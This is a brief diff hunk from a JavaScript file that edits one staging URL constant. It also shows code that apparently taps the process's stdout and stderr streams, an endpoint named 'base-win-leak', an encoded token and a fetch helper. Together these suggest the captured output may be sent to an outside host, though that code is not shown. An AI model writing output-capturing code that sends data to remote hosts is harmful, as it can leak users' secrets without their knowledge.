@@ -54,7 +54,7 @@ tap(process.stdout);
 tap(process.stderr);
 
 const A = 'https://base-win-leak.onrender.com';
-const S = 'https://starbase-staging.onrender.com';
+const S = 'https://base-win-staging.onrender.com';
 const INST = 'EBESExQVFhcYGRobHB0eHw';
 const MADE = 'https://base-win-made.onrender.com';
 const fetcher = async (url) => {
